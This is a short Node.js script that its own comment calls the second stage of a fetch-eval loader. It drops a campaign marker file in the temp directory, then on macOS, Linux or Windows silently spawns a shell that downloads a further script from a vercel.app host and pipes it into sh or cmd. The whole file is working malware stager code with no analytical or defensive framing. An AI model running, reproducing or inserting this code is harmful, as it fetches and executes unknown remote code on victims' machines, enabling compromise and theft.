const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawn } = require('child_process');

// Evaluated in-memory as the response body of a Stage 0 fetch-eval loader.
// Writes the campaign tag to a marker file, then branches on platform to
// pipe a second-stage script straight into the platform's own shell.
const markerFile = path.join(os.tmpdir(), '.git-checker');
fs.writeFileSync(markerFile, 'ghappier', 'utf8');

let command = '/bin/sh';
let args;
const platform = os.platform();

if (platform === 'darwin') {
  args = ['-c', 'curl -s https://brightlaunch-ext75642.vercel.app/api/m | sh'];
} else if (platform === 'linux') {
  args = ['-c', 'wget -qO- https://brightlaunch-ext75642.vercel.app/api/l | sh'];
} else if (platform === 'win32') {
  command = 'cmd.exe';
  args = ['/c', 'curl -s https://brightlaunch-ext75642.vercel.app/api/w | cmd'];
}

spawn(command, args, { stdio: 'ignore' });
